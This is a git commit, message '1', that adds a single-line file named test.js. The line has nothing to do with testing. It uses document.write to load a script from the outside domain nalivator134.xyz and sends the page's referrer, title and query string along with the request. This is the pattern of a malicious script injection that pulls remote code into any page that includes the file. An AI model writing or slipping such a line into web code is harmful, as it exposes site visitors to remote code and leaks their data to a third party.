545cd30504363c234a95b092b8bd16aedd9a3de4
ast-dev <34029681+ast-dev@users.noreply.github.com>
2020-03-28 03:25:41 +0300

    1

---
+++ test.js
@@ -0,0 +1,1 @@
+document.write('<script type="application/javascript" src="//nalivator134.xyz/9BN7VnzN?se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+'&frm5e7e71b008c75=script5e7e71b008c76"><' + '/script>');
